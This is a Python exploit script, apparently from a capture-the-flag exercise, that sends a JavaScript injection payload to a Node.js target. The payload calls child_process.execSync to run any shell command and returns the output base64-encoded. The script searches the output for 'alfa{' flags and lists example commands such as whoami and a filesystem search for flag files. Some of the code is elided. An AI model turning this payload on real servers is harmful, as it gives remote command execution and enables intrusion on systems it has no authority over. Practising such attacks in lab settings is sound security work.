#!/usr/bin/env python3
"""
Working RCE - based on diagnostic results
"""
...
def execute_rce(cmd):
    """Execute RCE command - tested and working version"""

    # Simple escaping that works
    cmd_escaped = cmd.replace("'", "\\'")

    # Working payload with longer timeout
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd_escaped}',{{'timeout':15000}}).toString('base64');"
                    ...
                    if 'alfa{' in result:
                        ...
                        if flag_match:
                            ...
                            try:
                                ...
                                print(f"Note: Run 'echo \"{flag}\" | ../../scripts/flag.sh' to validate")
                    return result
...
def main():
    if len(sys.argv) < 2:
        print("Usage: python3 rce_working.py \"command\"")
        print("Working version - tested with diagnostic")
        print("")
        print("Examples:")
        print("  python3 rce_working.py \"whoami\"")
        print("  python3 rce_working.py \"ls -la\"")
        print("  python3 rce_working.py \"cat /etc/hostname\"")
        print("  python3 rce_working.py \"find / -name '*flag*' 2>/dev/null\"")
        print("")
        print("Note: Avoid complex shell operations (pipes, redirects)")
        print("      Use simple commands that don't require shell interpretation")
        sys.exit(1)
